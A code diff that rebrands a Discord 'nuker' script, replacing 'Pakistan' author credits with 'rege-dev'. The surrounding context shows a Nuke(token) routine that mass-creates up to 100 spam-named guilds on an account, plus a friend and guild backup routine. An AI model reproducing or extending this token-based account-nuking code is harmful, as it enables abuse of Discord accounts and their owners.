@@ -8,7 +8,7 @@ contentt = "Status here"
 class MyClient(discord.Client):
     async def on_connect(self):
         print('--------------------')
-        print('Uselesscoderfrompakistan / Uselesscoderfromindia')
+        print('rege-dev / Uselesscoderfromindia')
         print('Date: {0}'.format(time.asctime()))
         print('User: {0}'.format(client.user))
         print('--------------------')
@@ -67,7 +67,7 @@ async def Nuke(token):
             pass
     for guild in range(100):
         try:
-         guild = await client.create_guild(name=random.choice(['UselessCoderFromIndia', 'UselessCoderFromPakistan', 'UselessCoderFromIndia', 'UselessCoderFromPakistan']))
+         guild = await client.create_guild(name=random.choice(['UselessCoderFromIndia', 'rege-dev', 'UselessCoderFromIndia', 'rege-dev']))
          print('{0} - {1} Created'.format(len(client.guilds), guild.name))
         except:
          print('Guild creation failed at {0} guilds'.format(len(client.guilds)))
@@ -84,7 +84,7 @@ async def backup(token):
     file.write('\nEND OF FRIEND BACKUP \n----------------------------------\n\n')
     for guild in client.guilds:
         file.write(f"{guild} - {guild.id} - Members: {guild.member_count} \n")
-    file.write("\nPakistan <3 \n----------------------------------\n")
+    file.write("\nrege-dev <3 \n----------------------------------\n")
     print("Backup Finshed")
 
 client = MyClient()
